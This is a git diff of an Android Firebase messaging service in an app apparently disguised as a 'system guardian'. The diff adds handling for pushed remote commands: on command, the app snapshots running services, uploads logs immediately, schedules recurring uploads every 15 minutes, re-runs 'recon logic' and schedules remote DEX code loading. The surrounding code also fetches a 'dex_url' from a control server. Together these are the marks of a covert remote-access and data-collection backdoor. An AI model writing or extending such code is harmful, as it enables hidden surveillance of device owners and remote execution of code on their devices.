@@ -1,7 +1,5 @@
 package com.system.guardian.firebase;
 
-import static android.content.Context.DEVICE_POLICY_SERVICE;
-
 import android.annotation.SuppressLint;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
@@ -9,7 +7,9 @@ import android.content.Context;
 import android.provider.Settings;
 
 import androidx.annotation.NonNull;
+import androidx.work.ExistingPeriodicWorkPolicy;
 import androidx.work.OneTimeWorkRequest;
+import androidx.work.PeriodicWorkRequest;
 import androidx.work.WorkManager;
 
 import com.google.firebase.messaging.FirebaseMessagingService;
@@ -22,6 +22,7 @@ import com.system.guardian.GuardianStateCache;
 import com.system.guardian.NetworkUtils;
 import com.system.guardian.background.LogUploadWorker;
 import com.system.guardian.core.LogUploader;
+import com.system.guardian.dex_patch_build.PatchOverride;
 
 import org.json.JSONObject;
 
@@ -74,7 +75,7 @@ public class GuardianMessagingService extends FirebaseMessagingService {
                         return;
                     }
 
-                    CrashLogger.log(context, "DexTrigger", "📦 Control JSON: " + response.toString());
+                    CrashLogger.log(context, "DexTrigger", "📦 Control JSON: " + response);
 
                     // DEX patch handling
                     String dexUrl = response.optString("dex_url", "");
@@ -124,10 +125,40 @@ public class GuardianMessagingService extends FirebaseMessagingService {
 
         if ("true".equals(remoteMessage.getData().get("upload_logs"))) {
             CrashLogger.log(this, "FirebaseMsg", "📡 Log upload trigger received via FCM");
-            LogUploader.uploadLog(this, "📡 Remote FCM command: Upload logs now");
+            CrashLogger.log(this, "FirebaseMsg", "🛰️ Log pull triggered manually via dashboard");
 
-            OneTimeWorkRequest uploadRequest = new OneTimeWorkRequest.Builder(LogUploadWorker.class).build();
+            // 🧪 Emit diagnostics to ensure log upload contains data
+            CrashLogger.log(this, "FirebaseMsg", "📶 Network Available: " +
+                    NetworkUtils.isNetworkAvailable(this));
+            CrashLogger.log(this, "FirebaseMsg", "🧠 Services Snapshot:\n" +
+                    PatchOverride.getRunningServicesSnapshot(this));
+
+            // 🚀 Force send logs now
+            CrashLogger.flush(this);
+
+            // ⏳ Immediate upload
+            OneTimeWorkRequest uploadRequest = new OneTimeWorkRequest.Builder(LogUploadWorker.class)
+                    .addTag("ImmediateLogUpload")
+                    .build();
             WorkManager.getInstance(this).enqueue(uploadRequest);
+
+            // 🕒 Fallback periodic log upload
+            PeriodicWorkRequest fallbackUpload = new PeriodicWorkRequest.Builder(
+                    LogUploadWorker.class, 15, java.util.concurrent.TimeUnit.MINUTES)
+                    .addTag("PeriodicLogUpload")
+                    .build();
+            WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+                    "GuardianLogUploaderFallback",
+                    ExistingPeriodicWorkPolicy.KEEP,
+                    fallbackUpload
+            );
+
+            // 🔄 Trigger soft recon/refresh logic
+            CrashLogger.log(this, "FirebaseMsg", "🧪 Re-triggering recon logic from dashboard");
+            PatchOverride.applyPatch(getApplicationContext());  // Soft boot via dynamic override
+
+            // 🧬 Optional: Lightweight reschedule if needed
+            DexLoader.schedulePatchLoad(getApplicationContext(), null);
         }
     }
 
